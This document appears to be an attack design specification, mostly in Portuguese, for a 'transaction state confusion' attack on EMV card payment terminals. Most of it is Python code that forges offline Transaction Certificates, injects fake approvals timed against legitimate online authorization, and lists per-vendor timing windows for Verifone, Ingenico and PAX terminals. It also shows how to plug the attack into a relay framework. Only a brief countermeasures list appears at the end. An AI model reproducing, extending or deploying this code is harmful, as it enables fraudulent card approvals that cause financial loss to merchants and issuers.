# Attack Vector 2: Transaction State Confusion Attack

## Concept
**Nome:** "Confusão de Estado de Autorização"
**Alvo:** Máquina de estados do terminal durante processamento online/offline
**Objetivo:** Explorar janelas de timing entre decisões de autorização para criar estados conflitantes de transação.

## Technical Description

### Attack Flow
1. **State Initialization**: Card solicita autorização online (ARQC)
2. **Race Condition**: Adversário injeta aprovação offline falsa (TC) antes da resposta online
3. **State Confusion**: Terminal processa ambas as respostas, criando estado inconsistente
4. **Exploitation**: Aproveitamento do estado confuso para bypass de controles

### Vulnerable Components
- **Authorization State Machine**: Lógica de transição entre estados online/offline
- **Response Processing**: Falta de serialização adequada de respostas
- **Timeout Handling**: Janelas de timing exploráveis entre requisições

### Implementation Details

#### Core State Confusion Logic (Python)
```python
class StateConfusionAttack:
    def __init__(self, relay_server):
        self.relay_server = relay_server
        self.pending_transactions = {}
        self.timing_window_ms = 50  # Critical timing window
        
    def initiate_state_confusion(self, pan, atc, original_arqc):
        """
        Inicia ataque de confusão de estado
        """
        # Store original ARQC transaction
        tx_key = f"{pan}_{atc}"
        self.pending_transactions[tx_key] = {
            'state': 'PENDING_ONLINE',
            'original_arqc': original_arqc,
            'timestamp': time.time()
        }
        
        # Immediately inject fake offline approval
        self.inject_fake_offline_approval(pan, atc)
        
    def inject_fake_offline_approval(self, pan, atc):
        """
        Injeta aprovação offline falsa antes da resposta online
        """
        # Create fake TC (Transaction Certificate)
        fake_tc_data = self.generate_fake_tc(pan, atc)
        
        # Inject with carefully calculated timing
        threading.Timer(
            self.timing_window_ms / 1000.0,
            self.send_fake_response,
            args=[fake_tc_data]
        ).start()
        
    def generate_fake_tc(self, pan, atc):
        """
        Gera Transaction Certificate falso
        """
        # Build fake cryptogram
        fake_master_key = self.generate_session_key()
        fake_iad = os.urandom(8)  # Random IAD
        
        # Create TC structure
        tc_data = {
            'cid': 'TC',  # Transaction Certificate
            'atc': atc,
            'ac': self.calculate_fake_ac(fake_master_key, atc, fake_iad),
            'iad': fake_iad
        }
        
        return self.build_apdu_response(tc_data)
    
    def calculate_fake_ac(self, key, atc, iad):
        """
        Calcula Application Cryptogram falso plausível
        """
        # Use session key derivation similar to real cards
        session_key = self.derive_session_key(key, atc)
        
        # Build MAC input similar to real implementation
        mac_input = struct.pack('>H', atc) + iad + b'\x9F\x02\x06'  # Amount tag
        
        return hmac.new(session_key, mac_input, hashlib.sha1).digest()[:8]
    
    def exploit_timing_window(self, terminal_session):
        """
        Explora janela de timing específica do terminal
        """
        # Different terminals have different timing windows
        terminal_type = self.identify_terminal_type(terminal_session)
        
        timing_configs = {
            'verifone': {'window_ms': 45, 'offset_ms': 5},
            'ingenico': {'window_ms': 60, 'offset_ms': 10},
            'pax': {'window_ms': 40, 'offset_ms': 8}
        }
        
        config = timing_configs.get(terminal_type, {'window_ms': 50, 'offset_ms': 7})
        return config

# Advanced Race Condition Exploitation
class RaceConditionExploiter:
    def __init__(self):
        self.response_queue = queue.Queue()
        self.state_tracker = {}
        
    def setup_race_condition(self, transaction_id):
        """
        Configura condição de corrida para transação específica
        """
        # Thread 1: Monitor online response
        online_thread = threading.Thread(
            target=self.monitor_online_response,
            args=[transaction_id]
        )
        
        # Thread 2: Inject offline response
        offline_thread = threading.Thread(
            target=self.inject_offline_response,
            args=[transaction_id]
        )
        
        # Start both threads with precise timing
        offline_thread.start()
        time.sleep(0.001)  # 1ms offset
        online_thread.start()
        
    def monitor_online_response(self, transaction_id):
        """
        Monitora resposta online legítima
        """
        try:
            # Wait for legitimate online response
            response = self.wait_for_online_response(transaction_id, timeout=5.0)
            
            if response:
                # Delay legitimate response slightly
                time.sleep(0.02)  # 20ms delay
                self.response_queue.put(('ONLINE', response))
                
        except TimeoutError:
            # Online timeout - perfect for offline injection
            self.response_queue.put(('TIMEOUT', None))
    
    def inject_offline_response(self, transaction_id):
        """
        Injeta resposta offline no momento preciso
        """
        # Wait for optimal injection moment
        time.sleep(0.015)  # 15ms injection delay
        
        fake_offline = self.create_offline_approval(transaction_id)
        self.response_queue.put(('OFFLINE', fake_offline))

# Terminal State Machine Exploitation
class TerminalStateMachine:
    def __init__(self):
        self.states = ['IDLE', 'CARD_PRESENT', 'APP_SELECTED', 'PENDING_AUTH', 'AUTHORIZED', 'DECLINED']
        self.current_state = 'IDLE'
        self.transitions = {}
        
    def exploit_state_transition(self, from_state, to_state, attack_payload):
        """
        Explora transições de estado vulneráveis
        """
        # Identify vulnerable transition
        if from_state == 'PENDING_AUTH' and to_state == 'AUTHORIZED':
            # Inject conflicting authorization
            return self.inject_dual_authorization(attack_payload)
            
        elif from_state == 'APP_SELECTED' and to_state == 'PENDING_AUTH':
            # Manipulate auth request
            return self.manipulate_auth_request(attack_payload)
            
        return False
    
    def inject_dual_authorization(self, payload):
        """
        Injeta dupla autorização para criar confusão
        """
        # Create conflicting auth responses
        auth1 = {'type': 'ONLINE', 'result': 'APPROVED', 'source': 'BANK'}
        auth2 = {'type': 'OFFLINE', 'result': 'APPROVED', 'source': 'CARD'}
        
        # Send both with minimal timing difference
        self.send_auth_response(auth1)
        time.sleep(0.001)
        self.send_auth_response(auth2)
        
        return True
```

## Framework Integration

### Modifications Required

#### In `relay_server` module:
```python
# Add to relay_server/attacks/state_confusion.py
class StateConfusionProcessor:
    def __init__(self, relay_core):
        self.relay_core = relay_core
        self.attack_engine = StateConfusionAttack(relay_core)
        self.timing_analyzer = TimingAnalyzer()
        
    def process_authorization_flow(self, apdu_stream):
        # Detect ARQC requests
        if self.is_arqc_request(apdu_stream):
            return self.attack_engine.initiate_state_confusion(
                pan=self.extract_pan(apdu_stream),
                atc=self.extract_atc(apdu_stream),
                original_arqc=apdu_stream
            )
        return apdu_stream
```

#### In `core_toolkit` module:
```python
# Add to core_toolkit/timing/precision_timing.py
class PrecisionTimer:
    def __init__(self):
        self.high_res_timer = time.perf_counter
        
    def calculate_injection_timing(self, terminal_type, network_latency):
        """
        Calcula timing preciso para injeção baseado no tipo de terminal
        """
        base_timing = {
            'verifone_vx520': 45,
            'ingenico_ict250': 60,
            'pax_s920': 40
        }
        
        adjustment = network_latency * 0.5  # Compensation factor
        return base_timing.get(terminal_type, 50) + adjustment
```

## Success Criteria
- Terminal entra em estado confuso processando dupla autorização
- Bypass de controles de autorização única
- Exploração bem-sucedida dentro de janela < 100ms

## Countermeasures
- Serialização rigorosa de respostas de autorização
- Timeout reduzido para prevenção de race conditions
- Validação de estado antes de transições críticas
- Lock de transação durante processamento de autorização

## Testing Scenarios
1. **Online → Offline Race**: ARQC seguido de TC falso
2. **Dual Authorization**: Duas respostas simultâneas com CIDs diferentes
3. **Timeout Exploitation**: Injeção durante timeout de rede
4. **State Rollback**: Exploração de rollback de estado após falha